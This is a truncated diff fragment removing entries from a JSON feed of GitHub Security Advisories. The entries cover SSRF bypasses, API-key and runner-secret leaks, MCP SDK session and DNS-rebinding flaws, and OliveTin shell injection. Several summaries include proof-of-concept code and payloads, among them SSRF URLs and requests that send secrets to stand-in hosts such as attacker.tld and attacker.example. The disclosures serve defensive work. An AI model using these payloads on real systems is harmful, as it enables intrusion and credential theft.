MessagePack::Buffer.new(nil, write_reference_threshold: 4096)\nb2.write(secret)\nleaked = b1.read_all\ndonor  = b2.read_all\nputs 'b1_first64:' + leaked.byteslice(0, 64)\nputs 'b2_donor64",
-      "link": "https://github.com/advisories/GHSA-4mrv-5p47-p938",
-      "published": "2026-07-30T16:33:12Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54522"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54722",
-      "title": "dssrf has an SSRF bypass with remove_at_symbol_in_string",
-      "summary": "## Summary\n\n`is_url_safe` in v1.0.3 contains an SSRF bypass. `remove_at_symbol_in_string` is applied to the raw URL string **before** `new URL()` parses it. This strips the `@` that separates userinfo from host, corrupting the hostname so internal IPs are never checked.\n\n## Vulnerability\n\nIn `helpers.ts`, `is_url_safe` does:\n\n```ts\nu = remove_at_symbol_in_string(u);   // strips ALL '@' from the raw string\n// ...\nconst parsed = new URL(u);\nconst hostname = parsed.hostname;    // resolved from the corrupted string\n```\n\n### What happens step by step\n\nInput: `http://evil.com@127.0.0.1/`\n\n1. `remove_at_symbol_in_string` \u2192 `http://evil.com127.0.0.1/`\n2. `new URL(...)` \u2192 `hostname = \"evil.com127.0.0.1\"`\n3. Not a bare IP, not IPv6 \u2192 passes all IP checks\n4. `is_hostname_resolve_to_internal_ip(\"evil.com127.0.0.1\")` \u2192 NXDOMAIN \u2192 returns false\n5. **Result: `true` (safe)** \u2014 but any HTTP client using the *original* URL connects to `127.0.0.1`\n\n### Proof of Concept\n\n```js\nimport nock from 'nock';\nimport { got } from 'got';\nimport { is_url_safe } from 'dssrf';\n\n// Simulate an internal server at 10.0.0.1 that returns secret data\nnock('http://10.0.0.1:80').persist().get('/').reply(200, 'SECRET_DATA');\n\nconst BYPASS_URL = 'http://2@10.0.0.1/';\nconst PLAIN_URL  = 'http://10.0.0.1/';\n\n// dssrf should block both \u2014 it only blocks the plain one\nconsole.log('--- dssrf validator ---');\nconsole.log(`is_url_safe('${PLAIN_URL}')   =`, await is_url_safe(PLAIN_URL),  '\u2190 correctly blocked');\nconsole.log(`is_url_safe('${BYPASS_URL}') =`, await is_url_safe(BYPASS_URL), '\u2190 \u26a0\ufe0f  BYPASSED (should be false)');\n\n// HTTP client with the bypass URL \u2014 gets SECRET_DATA back from 10.0.0.1\nconsole.log('\\n--- HTTP client ---');\ntry {\n  const res = await got(BYPASS_URL, { retry: { limit: 0 } });\n  console.log(`got('${BYPASS_URL}') response:`, res.body, '\u2190 \u26a0\ufe0f  VULNERABLE');\n} catch (e) {\n  console.log(`got('${BYPASS_URL}') blocked:`, e.message);\n}\n```\n\n## Root Cause\n\n`@` in a URL separates `userinfo` (credentials",
-      "link": "https://github.com/advisories/GHSA-cg4g-m8jx-vjv2",
-      "published": "2026-07-30T16:26:52Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54722"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-67424",
-      "title": "Flyto2 Core: Guarded HTTP modules follow redirects into internal space without per-hop SSRF revalidation",
-      "summary": "## Summary\nThe HTTP modules that DO call the SSRF guard (`http.get`, `http.request`, `http.batch`) validate only the initial URL, then issue the request with aiohttp's default `allow_redirects=True` and perform no per-hop revalidation. An attacker hosts a public URL that 302-redirects to an internal address; the guard passes on the public host and aiohttp transparently follows the redirect into internal space, returning the internal body.\n\n## Root Cause\n`src/core/modules/atomic/http/get.py:116` calls `session.get(url, ...)` with no `allow_redirects` argument \u2192 aiohttp default `True`. `request.py:60` sets `allow_redirects=follow_redirects` (default True at :327); `batch.py:57` likewise. A repo grep of `http/` for `on_request_redirect` / `response.history` returns NONE \u2014 there is no redirect interception or Location revalidation.\n\n## Impact\nFull readable SSRF that defeats the primary SSRF control on the very modules that correctly validate. Confidentiality of internal/metadata responses (C:H), S:C.\n\n## Proof of Concept\nVerified live: `http.get` with allowlisted base `127.0.0.1` followed a `302 Location: http://127.0.0.2/...` (non-allowlisted) and returned `INTERNAL-VIA-REDIRECT`.\n```\nattacker hosts http://attacker.tld/r  ->  302 Location: http://<cloud-metadata-ip>/latest/meta-data/...\nexecute_module http.get {\"url\":\"http://attacker.tld/r\"}\n```\n\n## Attack Chain\n1. Entry: `execute_module http.get {url:\"http://attacker.tld/r\"}` (attacker 302->internal). Guard: `validate_url_with_env_config(url)` (get.py:104). Bypass proof: validation runs on `attacker.tld` (public) \u2192 passes; never re-run on the redirect target.\n2. Sink: `session.get(url)` (get.py:116) \u2014 no `allow_redirects` arg \u2192 aiohttp default True. Bypass proof: grep of `http/` for `on_request_redirect`/`response.history` \u2192 NONE.\n3. Impact: aiohttp follows 302 to the internal host; internal body returned (get.py:118).\n\n## Bypass Evidence\nLive PoC followed a 302 into non-allowlisted loopback and returned the internal ",
-      "link": "https://github.com/advisories/GHSA-c9hr-64h3-gxpc",
-      "published": "2026-07-30T14:48:16Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-67424"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-67428",
-      "title": "Flyto2 Core: Multiple HTTP-family modules fetch client-controlled URLs without the SSRF guard their siblings apply (SSRF to internal/metadata)",
-      "summary": "## Summary\nNumerous HTTP-emitting modules (`core.api.http_get`, `core.api.http_post`, `graphql.query`/`graphql.mutation`, `monitor.http_check`, `communication.slack_send`, `notification.{discord,slack,teams}.send_message`, `ai.vision_analyze` [anthropic path], `verify.visual_diff`, `browser.proxy_rotate`, and the `agent`/`llm` inline base_url branch) perform outbound requests to a fully client-controlled URL **without calling the project's own SSRF guard** (`validate_url_with_env_config`) that their sibling modules apply. An authenticated workflow-author can point the URL at the cloud metadata IP (169.254.169.254), a loopback/RFC1918 host, or any internal host and read the response, yielding cloud-metadata credential theft and internal service read/write.\n\n## Root Cause\nThe SSRF guard is per-module (there is NO global egress interception). Each module must call `validate_url_with_env_config` before issuing a request. The listed modules never call it \u2014 they only carry an `ssrf_protected` **metadata tag string** which enforces nothing. Exemplar: `src/core/modules/third_party/developer/http/requests.py` \u2014 grepping for `validate_url|ssrf|is_private` in requests.py returns 0 guard calls; `session.get(url)` fires at `:85` (HTTPGetModule) and `session.post` at `:188` (HTTPPostModule). SECURITY.md incorrectly lists `api.http_get` as SSRF-protected.\n\n## Impact\nReadable SSRF: full `{status_code, headers, body}` returned to the caller (requests.py:96-108). Enables theft of cloud IAM credentials from the metadata endpoint and read/write access to internal-only APIs. Scope Changed (S:C) \u2014 the request crosses into cloud-metadata / internal-network authority the workflow layer does not otherwise have.\n\n## Proof of Concept\nVerified live this session: `core.api.http_get` with `url` pointed at a loopback internal server returned the internal body `INTERNAL-SECRET-IAM-CREDENTIALS`, while the guarded sibling `http.get` returned `NETWORK_ERROR: Hostname blocked: 127.0.0.1` on the same i",
-      "link": "https://github.com/advisories/GHSA-pgwh-4jj4-qm8v",
-      "published": "2026-07-30T14:48:05Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-67428"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-67426",
-      "title": "Flyto2 Core: Unauthenticated flyto-verification /run: callback_url SSRF and internal runner-secret exfiltration",
-      "summary": "## Summary\nThe standalone `flyto-verification` service exposes `POST /run` with **no authentication**, on all interfaces (0.0.0.0:8344 per the shipped Dockerfile). The request body's `callback_url` is used verbatim for an outbound POST that **unconditionally attaches `X-Internal-Key: $FLYTO_RUNNER_SECRET`**. The `callback_url` bypasses the service's `target_allowed` allowlist (which only inspects `params.target_url`) and is never passed through any SSRF guard. This yields (a) unauthenticated SSRF to internal/metadata endpoints with an attacker-controlled JSON body, and (b) exfiltration of the internal runner secret to an attacker-controlled host \u2014 allowing forged authenticated callbacks to the real engine.\n\n## Root Cause\n- `src/core/verification_service.py:363-364` \u2014 `/run` has no `Depends`/auth dependency.\n- `resolve_callback_url` returns the client `callback_url` verbatim (`:315-316`).\n- `post_callback` attaches `X-Internal-Key: $FLYTO_RUNNER_SECRET` whenever the env var is set (`:327-335`).\n- `target_allowed` only gates `params.target_url` (`:259`), never `callback_url`. No `validate_url_*` anywhere in the file.\n- `Dockerfile.verification` CMD = `main('0.0.0.0', 8344)`; entrypoint `flyto-verification` in `pyproject.toml:107` \u2192 the shipped image binds all interfaces by default.\n\n## Impact\nUnauthenticated (PR:N) readable SSRF to internal/cloud-metadata with a controlled body (C:H, S:C), plus theft of `FLYTO_RUNNER_SECRET` to an attacker host \u2192 the attacker can then authenticate to the real engine callback endpoint (credential compromise, CWE-522).\n\n## Proof of Concept\nCode-proven this session (all lines confirmed on v2.26.6):\n```\nPOST http://<verification-host>:8344/run\n{\"workflowYaml\":\"...\",\"params\":{...},\"callback_url\":\"http://attacker.tld/collect\"}\n# -> service POSTs to attacker.tld with header X-Internal-Key: <FLYTO_RUNNER_SECRET>\n# Or callback_url=http://<cloud-metadata-ip>/... for internal SSRF with a controlled body.\n```\n\n## Attack Chain\n1. Entry: unauthenti",
-      "link": "https://github.com/advisories/GHSA-jx74-cqjv-2c67",
-      "published": "2026-07-30T14:47:41Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-67426"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-67425",
-      "title": "Flyto2 Core: LLM/API keys leak to an attacker-controlled base_url",
-      "summary": "## Summary\n\n`llm.chat` reads the operator's provider key from the environment (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, ...) and sends it in the `Authorization: Bearer` header to `base_url`, a parameter the caller controls. `base_url` is only checked against the SSRF guard, and the guard allows any public host, so pointing `base_url` at an attacker's server hands them the operator's key. flyto-core's own bounty scale rates \"environment access exposing secrets (e.g. `ANTHROPIC_API_KEY`)\" as High.\n\n## Affected code\n\n`src/core/modules/atomic/llm/chat.py` (`_call_openai`):\n\n```python\nbase_url = params.get('base_url')            # caller-controlled\nif base_url:\n    validate_url_with_env_config(base_url)    # SSRF check only; a public attacker host passes\nif not api_key:\n    api_key = os.getenv('OPENAI_API_KEY')     # operator's key\n...\nurl = (base_url or \"https://api.openai.com/v1\").rstrip('/') + \"/chat/completions\"\nheaders = {\"Authorization\": f\"Bearer {api_key}\"}\nawait client.post(url, headers=headers, json=payload)   # sent to base_url\n```\n\nThe same wiring (env key plus caller endpoint) exists in `ai.model` (which does not even SSRF-check `base_url`), `llm.agent`, and `vector.connector` (`QDRANT_API_KEY` with a caller `url`). The SSRF guard is the wrong control here: it stops private targets but does nothing about the key being sent to an attacker's public host.\n\n## Reproduction\n\nSave as `keyexfil_poc.py`, run with `PYTHONPATH=src/src python keyexfil_poc.py`. It sets an operator key in the environment and points `base_url` at a local capture server.\n\n```python\n#!/usr/bin/env python3\nimport asyncio\nimport os\nimport threading\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nos.environ[\"OPENAI_API_KEY\"] = \"sk-OPERATOR-SECRET-doNotLeak-9f8e7d6c5b4a\"\nos.environ[\"FLYTO_ALLOWED_HOSTS\"] = \"localhost\"   # stand-in for the attacker's public host\nCAPTURED = {}\n\nclass Attacker(BaseHTTPRequestHandler):\n    def do_POST(self):\n        CAPTURED[\"auth\"] = self.headers.get(\"Aut",
-      "link": "https://github.com/advisories/GHSA-qq9q-xgm3-xv9g",
-      "published": "2026-07-30T14:47:16Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-67425"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-67427",
-      "title": "Flyto2 Core: ${env.VAR} interpolation reads any env secret despite env.get being denylisted",
-      "summary": "## Summary\n\nThe capability policy denies the `env.get` and `env.load_dotenv` modules by default, with the stated reason that they read arbitrary host environment variables (API keys, DSNs) and are a secret-exfil risk. But the workflow engine's variable resolver expands `${env.VAR}` for any environment variable with no allowlist and no policy check, so the exact capability the denylist blocks is available to any workflow parameter. The resolved secret can then be sent out through any allowed module.\n\n## Affected code\n\n`src/core/engine/variable_resolver.py`:\n\n```python\nif var_type == 'env':\n    if len(parts) < 2:\n        return None\n    env_var = parts[1]\n    return os.getenv(env_var)      # any env var, no allowlist, not covered by module policy\n```\n\nThe module policy (`enforce_module_policy` in `module_policy.py`) gates module execution at `BaseModule.run`, but `${...}` interpolation happens earlier in the engine and is not subject to it. So denylisting `env.get` does not actually stop a workflow from reading host env secrets.\n\n## Reproduction\n\nSave as `envbypass_poc.py`, run with `PYTHONPATH=src/src python envbypass_poc.py`.\n\n```python\n#!/usr/bin/env python3\nimport os\nos.environ[\"AWS_SECRET_ACCESS_KEY\"] = \"AKIA-operator-super-secret-DO-NOT-LEAK\"\n\nfrom core.module_policy import module_filter\nfrom core.engine.variable_resolver import VariableResolver\n\nprint(\"env.get allowed?       \", module_filter.is_allowed(\"env.get\"))\nr = VariableResolver(params={}, context={})\nprint(\"resolve ${env.SECRET}: \", r.resolve(\"${env.AWS_SECRET_ACCESS_KEY}\"))\nprint(\"into an attacker URL:  \", r.resolve(\"https://attacker.example/collect?k=${env.AWS_SECRET_ACCESS_KEY}\"))\n```\n\nOutput:\n\n```\nenv.get allowed?        False\nresolve ${env.SECRET}:  AKIA-operator-super-secret-DO-NOT-LEAK\ninto an attacker URL:   https://attacker.example/collect?k=AKIA-operator-super-secret-DO-NOT-LEAK\n```\n\n`env.get` is denied, yet `${env.AWS_SECRET_ACCESS_KEY}` reads the same secret and drops it straight into a URL. ",
-      "link": "https://github.com/advisories/GHSA-hr7p-wg7r-hg9m",
-      "published": "2026-07-30T14:47:01Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-67427"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-67435",
-      "title": "linuxfabrik-lib: fetch() forwards credential headers across a cross-origin redirect",
-      "summary": "### Summary\n`lib.url.fetch()` follows HTTP redirects (`follow_redirects=True`). httpx strips only `Authorization` and `Cookie` when a redirect crosses the origin, so any other caller-supplied credential header (a session token such as Redfish's `X-Auth-Token`, an API key, ...) was still sent to the redirect target. A malicious or redirect-capable server can therefore answer an authenticated request with a `3xx` to an attacker-chosen host and receive the credential (server-side request forgery + token disclosure). The pre-httpx `urllib` implementation was worse: it forwarded every header, including `Authorization`, across cross-host redirects.\n\n### Impact\nAny plugin that authenticates to a host with a non-standard auth header and follows that host's redirects can be coerced into sending the credential, and an authenticated request, to another host the monitoring server can reach. The concrete case is the Redfish checks (`X-Auth-Token`), but the flaw is in the shared `fetch()` and affects every consumer.\n\n### Patches\nFixed in linuxfabrik-lib 6.0.0 (commit 6573ff9). On a cross-origin redirect (any scheme/host/port change other than a plain same-host HTTP-to-HTTPS upgrade) `fetch()` now keeps only benign transport headers and drops every other caller-supplied header, so credentials never follow a redirect to a different origin.",
-      "link": "https://github.com/advisories/GHSA-4jc5-g844-4x33",
-      "published": "2026-07-30T14:46:13Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-67435"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-67431",
-      "title": "MCP Ruby SDK: Ruby SSE Session Poisoning",
-      "summary": "### Summary\n**Vulnerability**: Missing Session Ownership Validation in the Ruby MCP SDK's Streamable and SSE HTTP transport implementation. Any attacker with a stolen session ID can execute tools with the victim's session. This is a silent attack - the victim's session is compromised and being used for unauthorized actions, but it is hard to know for the victim\n\n### Details\nhttps://github.com/modelcontextprotocol/ruby-sdk/blob/main/lib/mcp/server/transports/streamable_http_transport.rb#L260-L278\n\n**Victim** starts a legitimate MCP session and receives session ID abc-123\n**Attacker** obtains the session ID (various means - network sniffing, logs, etc. out of scope for this analysis)\n**Attacker** sends POST to /messages/abc-123 with a tool call\n**Server** accepts the request (no ownership validation!)\n**Server** executes the tool and sends response to victim's SSE stream\n**Victim** receives attacker's response, thinking it's legitimate\n\n### PoC\n[attacker_client.py](https://github.com/user-attachments/files/26044817/attacker_client.py)\n[legitimate_client.py](https://github.com/user-attachments/files/26044818/legitimate_client.py)\n\n**Prerequisites**\n\n1. Python 3.8+\n2. Install dependencies: `requests`\n\n**Running the Demo**\n\n1. **Terminal 1:** Start the Ruby MCP Server\n\n`ruby streamable_http_server.rb`\n\nMakes use of https://github.com/modelcontextprotocol/ruby-sdk/blob/main/examples/streamable_http_server.rb\nThis server has a tool call notification_tool which the clients call\n\n2. **Terminal 2:**  Start Victim Client\n\n`python3 legitimate_client.py`\n\n3.  **Terminal 3** - Attacker Client:\n\nCopy the session ID from Terminal 1 and run:\n\n```bash\npython3 attacker_client.py abc-123-def-456\n```\n4. **Back to Terminal 2** - Victim sees the injected response:\n\n### Impact\n\n- **Integrity:** HIGH - Attacker can execute unauthorized tools and modify state\n- **Availability:** LOW - Attacker can disrupt victim's session with injected responses\n\n### Additional Details\nSession Hijacking Prot",
-      "link": "https://github.com/advisories/GHSA-5p9g-j988-pcwv",
-      "published": "2026-07-30T14:44:28Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-67431"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-63118",
-      "title": "MCP Ruby SDK: Streamable HTTP transport lacks DNS-rebinding (Host/Origin) protection",
-      "summary": "## Summary\n\n`MCP::Server::Transports::StreamableHTTPTransport` (the Rack-mountable Streamable HTTP transport in the `mcp` gem) processes every incoming JSON-RPC request without ever inspecting the HTTP `Host` or `Origin` request headers. There is no `AllowedHosts`/`AllowedOrigins` allowlist and no DNS-rebinding guard anywhere in the transport. A local MCP server that binds a loopback or LAN HTTP port is therefore reachable by any web origin a victim's browser visits, via a DNS-rebinding attack: a malicious page rebinds its own hostname to `127.0.0.1`, then drives the local MCP server cross-origin to enumerate and invoke its tools and exfiltrate their output. This is the standard browser-driven local-service attack that the MCP Streamable HTTP guidance exists to prevent.\n\n## Impact\n\n- An attacker who can get a victim to open a web page can reach any MCP server the victim runs locally over the Streamable HTTP transport (e.g. a developer-tools or filesystem MCP server on `localhost`).\n- Because the transport issues a session and dispatches `tools/list` / `tools/call` from a foreign `Host`/`Origin` with no rejection, the attacker can drive arbitrary server-exposed tools and read their results, exfiltrating local data (files, secrets, command output) to the attacker's origin.\n- The blast radius is whatever the locally-running MCP server exposes. For MCP servers wired to filesystem, shell, or credential tools, this is sensitive-data disclosure and, depending on the tool set, local action execution.\n\n## Vulnerable code\n\nFile: `lib/mcp/server/transports/streamable_http_transport.rb` (gem `mcp` 0.18.0).\n\nThe Rack entrypoint and POST handler validate `Accept`, `Content-Type`, `Mcp-Session-Id`, and `Mcp-Protocol-Version`, but never `Host` or `Origin`:\n\n```ruby\n# call(env) -> handle_request(Rack::Request.new(env))  (line 56)\ndef handle_post(request)\n  required_types = @enable_json_response ? REQUIRED_POST_ACCEPT_TYPES_JSON : REQUIRED_POST_ACCEPT_TYPES_SSE\n  accept_error = valid",
-      "link": "https://github.com/advisories/GHSA-rjr6-rcgv-9m7m",
-      "published": "2026-07-30T14:41:39Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-63118"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-67438",
-      "title": "OliveTin OS Command Injection via Custom regex: Argument Type Bypassing Shell Safety Check",
-      "summary": "### Summary\nOliveTin's checkShellArgumentSafety() function maintains a blocklist of argument types unsafe for Shell mode actions, but does not include regex:-prefixed types. Because regex: support was added independently via typeSafetyCheckRegex(), any Shell mode action using a regex:-typed argument bypasses the safety check unconditionally. The unvalidated value is then interpolated directly into the sh -c command string via Go's text/template with no escaping, enabling shell injection. Notably, even restrictive-looking patterns are exploitable \u2014 for example, a pattern blocking common shell metacharacters remains bypassable via POSIX command substitution.\n\n### Details\nOliveTin is an open source web UI for running pre-configured shell commands. In the OliveTin service component, the function checkShellArgumentSafety() in service/internal/executor/arguments.go enforces a blocklist of argument types that are unsafe for use in Shell mode actions (actions that execute via sh -c). The blocklist includes password, very_dangerous_raw_string, url, email, and raw_string_multiline. It does not handle custom regex: prefixed argument types.\n\nCustom regex: types are supported by a separate function, typeSafetyCheckRegex(), which checks whether a submitted value matches the provided pattern. These two functions evolved independently: when regex: prefix support was added to typeSafetyCheckRegex, checkShellArgumentSafety was not updated to treat regex: types as unsafe for Shell mode. As a result, any action configured with a Shell mode handler and a regex:-typed argument passes the safety check unconditionally, regardless of how permissive or restrictive the pattern is.\n\nThe argument value then reaches handleShellBranch \u2192 wrapCommandInShell, where Go's text/template interpolates it directly into the sh -c command string with no escaping.\n\nCritically, this vulnerability is not limited to obviously permissive patterns like regex:.*. An admin who writes a restrictive-looking pattern s",
-      "link": "https://github.com/advisories/GHSA-xc5w-4v5w-7x65",
-      "published": "2026-07-30T14:31:12Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-67438"
       ],
       "is_zero_day": false,
       "is_high_severity": true
